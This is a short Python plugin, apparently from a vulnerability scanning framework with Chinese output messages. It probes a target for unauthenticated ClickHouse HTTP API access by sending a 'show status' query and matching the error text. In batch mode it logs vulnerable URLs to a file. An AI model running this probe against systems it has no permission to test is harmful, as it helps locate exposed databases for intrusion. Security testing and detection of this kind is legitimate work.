import urllib3,requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class ClickHouse_Sql_Scan:
    def run(self,url):
        base_url = url + "/?query=show%20status"
        try:
            response = requests.get(base_url,headers=self.headers,verify=self.ssl,proxies=self.proxy)
            if "Code: 62" in response.text:
                OutPrintInfoSuc("ClickHouse", f"目标存在漏洞:{base_url}")
                if not self.batch:
                    OutPrintInfo("ClickHouse", f"执行结果:")
                    OutPrintInfo("ClickHouse", f"响应:\n{response.text.strip()}")
                else:
                    OutPutFile("clickhouse_sql.txt",f"目标存在漏洞: {base_url}")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ClickHouse", "目标不存在ClickHouse API数据库接口未授权访问漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("ClickHouse", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ClickHouse", f"开始检测ClickHouse API数据库接口未授权访问漏洞...")
        self.run(url)
        if not self.batch:
            OutPrintInfo("ClickHouse", f"ClickHouse API数据库接口未授权访问漏洞检测结束")